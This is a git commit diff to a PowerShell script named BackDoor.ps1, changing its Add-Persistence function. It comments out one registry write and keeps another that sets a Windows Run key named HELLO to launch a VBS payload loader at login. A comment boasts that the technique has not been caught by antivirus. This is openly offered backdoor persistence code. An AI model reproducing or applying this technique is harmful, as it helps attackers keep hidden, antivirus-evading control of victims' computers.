411b168dcf56e7df196e2ff7648afac15335e9c0
SharkSlayer <31451992+SharkSlayer@users.noreply.github.com>
2017-10-04 03:08:46 +0700

    Update BackDoor.ps1

--- BackDoor.ps1
+++ BackDoor.ps1
@@ -59,7 +59,7 @@ function Add-Persistence()
 	
 	# Set the LOAD key. Haven't been caught by AV yet. ;-)
 	Write-Host "[+] Updating registry with a LOAD key"
-	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath
+	#Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath
 	Set-ItemProperty -Path "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" -Name HELLO -Value $payloadvbsloaderpath
 	Write-Host "[+] Done!"
 }
